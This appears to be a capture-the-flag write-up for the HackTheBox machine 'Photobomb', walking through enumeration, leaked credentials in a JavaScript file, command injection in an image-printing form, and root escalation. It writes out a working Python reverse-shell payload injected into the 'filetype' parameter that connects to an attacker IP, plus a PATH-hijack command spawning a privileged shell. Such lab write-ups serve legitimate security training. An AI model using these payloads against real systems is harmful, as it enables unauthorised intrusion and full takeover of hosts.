## Photobomb | HackTheBox

You can access machine [here](https://app.hackthebox.com/machines/Ambassador)

<img src="https://user-images.githubusercontent.com/67650329/206399168-be61400d-a89c-49c5-8c19-b0210708b5a5.png" width="300px" align="center">

---

### Scanning / Enumeration 

`nmap -sC -sV -p- -T4 {IP}`

-sC = Run the default script.

-sV = Version of services.

-p- = Checking for all port.

-T4 = Scanning speed.

This is the result for the scanning with nmap tools:

<img src="https://user-images.githubusercontent.com/67650329/206399516-3cfa1f89-f8ed-41d8-b0a5-5334b8a330f4.png" width="500px" align="center">

Port open:

- 22 = SSH.
- 80 = HTTP.

Port 80 open we can access the website.

View the source code and we found another link. `http://photobomb.htb/photobomb.js`

Inside that page:
```java
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```
And we found the username and password. And another link web page.
```
Username: pH0t0
Password: b0Mb!
Website: http://photobomb.htb/printer
```

After we got the username and password. We search login domain use GOBUSTER.

`gobuster dir -u [TARGET_IP] -w [WORDLIST] -f -n`

- u = Url/Link Target.
- w = Wordlist to use.
- f = Nospam.
- n = No Status just result (Nospam).

This is the result from GOBUSTER.

<img src="https://user-images.githubusercontent.com/67650329/207796616-126df743-6c1d-4121-a8df-839f1047484c.png" width="500px" align="center">

Login the /printer/ use the username and password before. And you access into the menu.

<img src="https://user-images.githubusercontent.com/67650329/207796941-9988f5fa-299e-4f1b-badd-a30af52bb40b.png" width="500px" align="center">

We look and change the source code use BURP SUITE.

```
POST /printer HTTP/1.1
Host: photobomb.htb
Content-Length: 78
Cache-Control: max-age=0
Authorization: Basic cEgwdDA6YjBNYiE=
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Origin: http://photobomb.htb
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://photobomb.htb/printer
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg&dimensions=3000x2000
```
Change the extension `filetype` and we can use the [Reverse Shell](https://www.revshells.com/)

Remember before run the exploit. We must run the listener using NETCAT.
```
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png;export RHOST="10.10.14.45";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'&dimensions=3000x2000
```
<img src="https://user-images.githubusercontent.com/67650329/207798043-4202ea42-e49f-40f2-9b04-ca7bb0cb46a2.png" width="300px" align="center">

<img src="https://user-images.githubusercontent.com/67650329/207798091-18f4a589-3de5-417c-a7f6-82d77c6716ec.png" width="500px" align="center">

```
cd /tmp
touch find
echo "/bin/bash -p" > find
chmod +x find
sudo PATH=/tmp:$PATH /opt/cleanup.sh
```

<img src="https://user-images.githubusercontent.com/67650329/207798205-9a5040a0-1df6-4043-9056-ae485f220f45.png" width="300px" align="center">

Thank you for reading 👋.

---
